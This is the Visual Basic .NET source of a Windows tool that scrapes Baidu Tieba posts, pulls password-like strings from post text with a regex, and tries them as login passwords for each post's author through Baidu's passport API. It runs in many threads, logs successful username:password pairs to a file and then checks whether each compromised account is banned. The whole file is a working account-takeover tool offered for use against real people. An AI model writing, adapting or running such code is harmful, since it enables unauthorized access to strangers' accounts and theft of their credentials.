﻿Imports WindRunning.MyFunctions
Imports System.IO
Imports System.Text
Imports System.Net
Imports System.Threading
Imports System.Text.RegularExpressions
Imports Sunisoft.IrisSkin

Public Class Form1

    Private Skin As SkinEngine
    Private KeyWords As String()
    Private KWUbd As Integer = -1
    Private TB As String
    'Private Way As Integer = 1 '0:wap 1:tingapi
    Private ForeText As String
    Private PostText As String
    Private RegexText As String
    Private TrNum As Integer
    Private NdStop As Boolean
    Private EndCount As Integer
    Private SucSW As StreamWriter
    Private SucID As New List(Of String)

    Public Sub New()

        ' 此调用是设计器所必需的。
        InitializeComponent()

        ' 在 InitializeComponent() 调用之后添加任何初始化。
        WayComboBox.SelectedIndex = 0
        Me.NotifyIcon1.Icon = Me.Icon
        Me.NotifyIcon1.ShowBalloonTip(1000)
        Skin = New SkinEngine(Me, New MemoryStream(My.Resources.DeepCyan))
    End Sub

    Private Sub LinkLabel1_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Process.Start("http://sighttp.qq.com/msgrd?v=3&uin=562826179&site=%c8%d9%c8%d9%c8%ed%bc%fe&menu=yes")
    End Sub

    Private Sub NotifyIcon1_DoubleClick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NotifyIcon1.DoubleClick
        Me.Visible = Not Me.Visible
    End Sub

    Private Function IDTest(ByRef wc As WizardHTTP, ByVal id As String, ByVal pw As String) As Boolean
        Try

            Dim suc As New Boolean '0:success 1:failed
            Dim errmsg As String = ""
            'http
            wc.SetDefaultHeader()
            Dim retstr As String = wc.DownloadString("https://passport.baidu.com/v2/api/?getapi&class=login&tpl=mn&tangram=true")
            Dim left As Integer = retstr.IndexOf("token='")
            left += 7
            Dim right As Integer = retstr.IndexOf("'", left)
            Dim token As String = retstr.Substring(left, right - left)

            wc.SetDefaultHeader()
            Dim poststr As String = "ppui_logintime=7852&charset=utf-8&codestring=&token=" + token + "&isPhone=false&index=0&u=&safeflg=0&staticpage=http%3A%2F%2Fwww.baidu.com%2Fcache%2Fuser%2Fhtml%2Fjump.html&loginType=1&tpl=mn&callback=parent.bdPass.api.login._postCallback&username=" + URLEncoding(id, Encoding.UTF8) + "&password=" + pw + "&verifycode=&mem_pass=on"
            retstr = wc.UploadString("https://passport.baidu.com/v2/api/?login", poststr)
            left = retstr.IndexOf("&error=")
            left += 7
            right = retstr.IndexOf("'", left)
            Dim errno As String = retstr.Substring(left, right - left)

            If errno = "0" Then '成功
                suc = True
            Else '失败
                suc = False
                errmsg = LoginGetErrmsg(Convert.ToInt32(errno))
            End If

            If suc Then '成功
                '检查重复
                Dim exist As Boolean = False
                For Each i As String In SucID
                    If id = i Then exist = True
                    Exit For
                Next
                If exist Then Return False

                Console.ForegroundColor = ConsoleColor.Green
                Console.WriteLine(Time() + id + " " + pw + " 扫描成功！")
                Me.NotifyIcon1.ShowBalloonTip(1000, NotifyIcon1.BalloonTipTitle, id + " " + pw + " 扫描成功！", NotifyIcon1.BalloonTipIcon)
                SucID.Add(id)
                SucTextBox.AppendText(id + ":" + pw + vbCrLf)
                SucSW.WriteLine(id + ":" + pw)
                TestPrison(wc, id)
                Return True
            Else  '失败
                Console.ForegroundColor = ConsoleColor.Red
                Console.WriteLine(Time() + id + " " + pw + " 扫描失败！" + errmsg)
                Return False
            End If

        Catch ex As Exception
            Console.ForegroundColor = ConsoleColor.Red
            Console.WriteLine(Time() + ex.Message)
            Return False
        End Try

    End Function

    Private Sub TestPrison(ByRef wc As WizardHTTP, ByVal id As String)
        Try
            wc.SetDefaultHeader()
            Dim retstr As String = wc.DownloadString("http://tieba.baidu.com/i/sys/user_json?un=" + URLEncoding(id, Encoding.Default))
            Dim left As Integer = retstr.IndexOf("is_prison") + 11
            Dim right As Integer = retstr.IndexOf(",", left)
            Dim is_prison As String = retstr.Substring(left, right - left)
            If is_prison = "true" Then
                Me.NotifyIcon1.ShowBalloonTip(1000, NotifyIcon1.BalloonTipTitle, "ID: " + id + " 被封禁。", NotifyIcon1.BalloonTipIcon)
            Else
                Me.NotifyIcon1.ShowBalloonTip(1000, NotifyIcon1.BalloonTipTitle, "ID: " + id + " 没有被封禁。", NotifyIcon1.BalloonTipIcon)
            End If

        Catch ex As Exception
            Me.NotifyIcon1.ShowBalloonTip(1000, NotifyIcon1.BalloonTipTitle, ex.Message, NotifyIcon1.BalloonTipIcon)
        End Try
    End Sub

    Private Sub InputButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InputButton.Click
        If OpenFileDialog1.ShowDialog() = Windows.Forms.DialogResult.OK Then
            Dim sr As New StreamReader(OpenFileDialog1.FileName, Encoding.Default)
            Me.KeyWordTextBox.AppendText(sr.ReadToEnd())
            sr.Close()
            Console.ForegroundColor = ConsoleColor.Green
            Console.WriteLine(Time() + "导入成功！")
        End If
    End Sub

    Private Sub CopyButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CopyButton.Click
        If SucTextBox.Text <> "" Then
            Clipboard.SetText(SucTextBox.Text)
            Me.NotifyIcon1.ShowBalloonTip(1000, NotifyIcon1.BalloonTipTitle, "复制成功！", NotifyIcon1.BalloonTipIcon)
        End If
    End Sub

    Private Sub OutButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OutButton.Click
        If SaveFileDialog1.ShowDialog() = DialogResult.OK Then
            Dim sw As New StreamWriter(SaveFileDialog1.FileName, True)
            sw.Write(SucTextBox.Text)
            sw.Close()
            Console.ForegroundColor = ConsoleColor.Green
            Console.WriteLine(Time() + "已导出。")
        End If
    End Sub

    Private Sub StartButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartButton.Click
        Try
            StartButton.Enabled = False
            '检测必填项
            If KeyWordTextBox.Text = "" Or RETextBox.Text = "" Then
                Throw New Exception("请填写必填项！")
            End If

            '初始化全局变量
            KeyWords = KeyWordTextBox.Text.Split(vbCrLf)
            KWUbd = UBound(KeyWords)
            If KeyWords(KWUbd) = "" Then KWUbd -= 1
            For i As Integer = 0 To KWUbd
                KeyWords(i) = URLEncoding(KeyWords(i), Encoding.Default)
            Next

            RegexText = RETextBox.Text
            ForeText = ForeTextBox.Text
            PostText = PostTextBox.Text
            TrNum = TrNumeric.Value
            TB = URLEncoding(TBTextBox.Text, Encoding.Default)
            'Way = WayComboBox.SelectedIndex
            NdStop = False
            EndCount = TrNum
            SucID = New List(Of String)

            SucSW = New StreamWriter(IO.Directory.GetCurrentDirectory() + "\成功区.txt", True, Encoding.Default)
            SucSW.AutoFlush = True

            Console.ForegroundColor = ConsoleColor.Yellow
            Console.WriteLine(Time() + "开始扫描...")
            Me.NotifyIcon1.ShowBalloonTip(1000, NotifyIcon1.BalloonTipTitle, "任务开始...", NotifyIcon1.BalloonTipIcon)

            Dim tr As New Thread(AddressOf ScanMain)
            tr.Start()

            StopButton.Enabled = True
        Catch ex As Exception
            Console.ForegroundColor = ConsoleColor.Red
            Console.WriteLine(Time() + ex.Message)
            StartButton.Enabled = True
        End Try
    End Sub

    Private Sub ScanMain()
        '启动线程
        For i As Integer = 1 To TrNum
            Dim tr As New Thread(AddressOf Scan)
            tr.Start(i)
        Next

        While EndCount <> 0 : Thread.Sleep(400) : End While
        TaskEnd()
    End Sub

    Private Sub Scan(ByVal index As Integer)

        Dim re As New Regex(RegexText)
        Dim wc As New WizardHTTP
        wc.Headers.Set(HttpRequestHeader.Cookie, "SAVEUSERID=; BAIDUID=:FG=1; BDUT=")

        For i_kw As Integer = 0 To KWUbd

            If NdStop Then Exit For
            For i As Integer = index To 30 Step TrNum
                If NdStop Then Exit For
                Try
                    wc.SetDefaultHeader()
                    Dim retstr As String = wc.DownloadString("http://tieba.baidu.com/f/search/res?qw=" + KeyWords(i_kw) + "&kw=" + TB + "&rn=30&sm=1&pn= " + i.ToString())
                    Dim left As Integer = retstr.IndexOf("class=""s_post_list")
                    Dim right As Integer

                    While Not NdStop
                        left = retstr.IndexOf("p_content"">", left)
                        If left = -1 Then Exit While
                        left += 11
                        right = retstr.IndexOf("</div>", left)
                        If right = -1 Then Exit While
                        Dim content As String = retstr.Substring(left, right - left)
                        Dim rm As Match = re.Match(content)
                        If Not rm.Success Then Continue While
                        Dim pw As String = rm.Value
                        right = retstr.IndexOf("作者：", right)
                        If right = -1 Then Exit While
                        left = retstr.IndexOf("p_violet"">", right)
                        If left = -1 Then Exit While
                        left += 10
                        right = retstr.IndexOf("</font>", left)
                        If right = -1 Then Exit While
                        Dim id As String = retstr.Substring(left, right - left)
                        IDTest(wc, id, ForeText + pw + PostText)
                        left = right
                    End While
                Catch ex As Exception
                    Console.WriteLine(Time() + ex.Message)
                End Try
            Next
        Next

        EndCount -= 1
    End Sub

    Private Sub TaskEnd()
        SucSW.Close()
        Console.ForegroundColor = ConsoleColor.Yellow
        Console.WriteLine(Time() + "任务完成！")
        Me.NotifyIcon1.ShowBalloonTip(1000, NotifyIcon1.BalloonTipTitle, "已完成。", NotifyIcon1.BalloonTipIcon)
        StartButton.Enabled = True
        StopButton.Enabled = False
    End Sub

    Private Sub StopButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StopButton.Click
        NdStop = True
        Console.ForegroundColor = ConsoleColor.Yellow
        Console.WriteLine(Time() + "用户停止任务，请等待当前线程结束！")
    End Sub

    Private Sub Form1_DragEnter(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles MyBase.DragEnter
        If e.Data.GetDataPresent(DataFormats.FileDrop) Then '若拖放进来的对象是文件  
            e.Effect = DragDropEffects.All '改变拖放操作的行为，使对象可以被复制或移动至列表视图框  
        End If
    End Sub

    Private Sub Form1_DragDrop(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles MyBase.DragDrop
        For Each sFile As String In e.Data.GetData(DataFormats.FileDrop) '将拖放进来的文件添加至列表视图框  
            If Microsoft.VisualBasic.Right(sFile, 4) = ".txt" Then
                Dim sr As New StreamReader(sFile, Encoding.Default)
                KeyWordTextBox.AppendText(sr.ReadToEnd())
                sr.Close()
            End If
        Next
    End Sub

    Private Sub LinkLabel2_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel2.LinkClicked
        Process.Start("http://www.258ch.com/forum-48-1.html")
    End Sub

    Private Shared Function LoginGetErrmsg(ByVal errno As Integer) As String
        Select Case errno
            Case 1
                Return "用户名格式错误"
            Case 2
                Return "用户不存在"
            Case 4
                Return "登录密码错误"
            Case 6
                Return "验证码不匹配，请重新输入验证码"
            Case 16
                Return "对不起，您现在无法登陆"
            Case 257
                Return "请输入验证码"
            Case 110024
                Return "请激活帐号"
            Case -1
                Return "接口参数错误"
            Case -2
                Return "签名错误"
            Case -3
                Return "未找到的tpl+appid组合"
            Case -4
                Return "访问方IP未授权"
            Case -5
                Return "证书已失效"
            Case -6
                Return "指定的cert_id不存在"
            Case Else
                Return "错误代码：" + errno.ToString()
        End Select
    End Function
End Class
